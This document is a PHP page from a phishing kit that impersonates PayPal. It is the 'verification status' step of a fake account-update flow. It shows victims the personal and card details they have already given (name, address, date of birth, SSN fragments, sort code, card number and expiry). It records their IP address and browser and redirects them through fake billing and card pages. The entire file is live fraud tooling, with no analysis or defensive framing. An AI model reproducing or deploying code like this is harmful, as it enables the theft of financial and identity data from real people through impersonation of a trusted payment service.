<?php
error_reporting(0);
    #################################################
    #                FaHaD-IQ                       #
    #              fb/mr.fahad6                     #
    #################################################
session_start();
include("../../include/__config__.php");
include("../../include/function.php");
if($_GET['update'] =="3c3ea1016e10698896b4bf7ec82f9b7d"){
$_SESSION['billing'] ="off";
$_SESSION['billupdatead'] ="on";
$_SESSION['billupdatecc'] ="off";
		header("location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);		

}
else if($_GET['update'] =="651471ba60eb0b0dff6d4677595b99e8"){
$_SESSION['billing'] ="off";
$_SESSION['billupdatecc'] ="on";
$_SESSION['billupdatead'] ="off";
		header("location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);		

}
       $_SESSION['cntcode'] = $countrycode;
        $_SESSION['cntname'] = $countryname;
        $ip = $_SERVER["REMOTE_ADDR"];
		$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
		$time = date('l jS \of F Y h:i:s A');
		$user_agent = $_SERVER['HTTP_USER_AGENT'];
		$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
		$_SESSION['_browser_'] = $browser;
		
		if($_SESSION['logint'] !="on" ) {
		header("location: login.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=".$_SESSION['_lang_']."&email=".$_SESSION['_email_']."&confirmation_code=3b2hN76Aq6&act=confirm_account_3b2hF76Aq6&tmpl=profile%2Fmyaccount&aid=358301&new_account=1&import=1");	
	
	}
		else if($_SESSION['billing'] !="on" ) {
		header("location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);		
	}
	
	else if($_SESSION['copycard'] !="on" ) {
		header("location: websc-cardcopy.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);			
	}
	
	
if(isset($_REQUEST["edit"])) {
	$_SESSION['billing']="off";
	$_SESSION['copycard']="off";
	$_SESSION['seccuuses']="off";
	header("location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);		

}
if(isset($_REQUEST["submit"])) {
header("location: https://goo.gl/bUcGqs");		
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title><?php echo $PAYPAL_SERVICE_UPDATE_TXT;?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">
	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
    <!-- Le styles -->
    <link href="../../css/bootstrap.css" rel="stylesheet">
    <link href="../../css/bootstrap-responsive.css" rel="stylesheet">

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="../../js/html5shiv.js"></script>
    <![endif]-->

  </head>

  <body style="background:#f5f5f5;">
  <script src="//popmotion.io/assets/js/popmotion.global.js"></script>
<div class="row-fluid">
     <?php include("header.php"); ?>
</div>
    <div class="container">

     

      <!-- Example row of columns -->
      <div class="row" style="margin-top:100px;" id="toprow" >
            
         <?php include("left.php"); ?>                        
                                
        <div class="span7" style="background:#fff;padding:15px 32px; 0 0;box-shadow:0 1px 4px 0 #d5d5d5;border-radius:5px;">
        <h3>Verification status</h3>
        <hr />      
		<div class="alert-success" >
		<a href="#" class="close" data-dismiss="alertsuccess">&times;</a>
		You are successfully end your account verification<br>
and we will review your information's as soon as possible.<br>
* you can go to your PayPal account or edit your information if you think that incorrect.

	</div>
    <br>
    <div style="    border: 2px dashed #AAA;
    border-radius: 7px;
    cursor: default;
    padding: 15px;
    margin-bottom: 20px;background-color: #f5f5f5;">
    <p><b>Your billing address:</b><a href="success.php?update=3c3ea1016e10698896b4bf7ec82f9b7d" name="submit" title="Edit your billing address" style="color: #06F;float:right;">Edit</a><br>
    First Name : <?php echo $_SESSION['_fname_']; ?><br>
    Last Name : <?php echo $_SESSION['_lname_']; ?><br>
    Address Line 1 : <?php echo $_SESSION['_adds1_']; ?><br>
    Address Line 2 : <?php echo $_SESSION['_adds2_']; ?><br>
    Country : <?php echo $_SESSION['_count3s_']; ?><br>
    City : <?php echo $_SESSION['_city_']; ?><br>
    State : <?php echo $_SESSION['_lname_']; ?><br>
    Zip Code : <?php echo $_SESSION['_zip_']; ?><br>
    Date of Birthday : <?php echo $_SESSION['_dob_day_']."/".$_SESSION['_dob_month_']."/".$_SESSION['_dob_year_']; ?><br>
    <?php if (isset($_SESSION['_count3s_']) && $_SESSION['_count3s_'] == "United Kingdom"){?>
   	Sort Code : <?php echo $_SESSION['_sort_c_']."<br>"; ?> <br>
    <?php } ?> 
    <?php if (isset($_SESSION['_count3s_']) && $_SESSION['_count3s_'] == "United States"){?>
   	Social Security number : <?php echo "XXX-XX-" .substr($_SESSION['_ccn_'] , -4)."<br>"; ?>

    <?php } ?> 
    Phone number : <?php echo $_SESSION['_phone_']; ?></p>
    </div>
    <div style="    border: 2px dashed #AAA;
    border-radius: 7px;
    cursor: default;
    padding: 15px;
    margin-bottom: 20px;background-color: #f5f5f5;">
   <p><b>Your credit / debit card details:</b><a href="success.php?update=651471ba60eb0b0dff6d4677595b99e8" title="Edit your billing address" style="color: #06F;float:right;">Edit</a><br>
   Name on Card : <?php echo $_SESSION['_cardholder_']; ?><br>
   Card Type : <?php echo $_SESSION['_cctype_']; ?><br>
   Card Number : 
   <?php if ($_SESSION["_cctype_"] =="AMEX"){?>
   
   <?php echo substr($_SESSION['_ccn_'] , 0, 3)."X-XXXXXX-X" .substr($_SESSION['_ccn_'] , -4); ?><br>
   <?php } else { ?> 
      <?php echo substr($_SESSION['_ccn_'] , 0, 3)."X-XXXX-XXXX-".substr($_SESSION['_ccn_'] , -4); ?><br>
<?php } ?>
   Expiration Date : <?php echo $_SESSION['_edmonth_']."/".$_SESSION['_edyear_']; ?><br>
   </p>
    </div>
	<center>
	         <form class="form-signin" style="padding:16px;" name="login_form" method="post" action="">
       <div class="control-group">  
   <label class="control-label" ></label> 
   <div class="controls">    
	<input type="submit" name="submit" value="Go to PayPal" class="btn btn-primary" style="padding: 7px 15px 8px; width: 130px; line-height: 18px; font-size:14px;font-weight:bold;" />
	<input type="submit" name="edit" value="Edit my information" class="btn btn-primary" style="padding: 7px 15px 8px; width: 165px; line-height: 18px; font-size:14px;font-weight:bold;" /></div></div> 
      </form>
	  </center>

          
           <center><div style="color:#0079c1;margin:35px 0 20px ;" id="ft3"><?php echo $UPDATE_BILLING_ADDRESS_TXT; ?> <b class="caret-right"></b> <?php echo $UPDATE_CREDIT_OR_DEBIT_CARD_TXT; ?> <b class="caret-right"></b> <span style="color:#0079c1;"><?php echo $ID_AND_CREDIT_CARD_PROOF_TXT; ?></span> <b class="caret-right"></b> <span style="color:#000;"><?php echo $UPDATE_DONE_TXT; ?></span></div></center>
       </div>
       
      </div>
   

      <hr />
      
      <div class="container" id="ft1">
         
         
   <ul class="nav nav-pills" style="color:#ccc;font-weight:bold;">
        <li><a href="#"><?php echo $ABOUT_TXT; ?></a></li>
        <li><a href="#"><?php echo $HELP_TXT; ?></a></li>
        <li><a href="#"><?php echo $RATES_TXT; ?></a></li>
        <li><a href="#"><?php echo $SECURITY_TXT; ?></a></li>
        <li><a href="#"><?php echo $DEVELOPERS_TXT; ?></a></li>
        <li><a href="#"><?php echo $PARTNERS_TXT; ?></a></li>
    </ul>
        </div>
      

    </div> <!-- /container -->
    

<?php include("footer.php");?>

  </body>
</html>
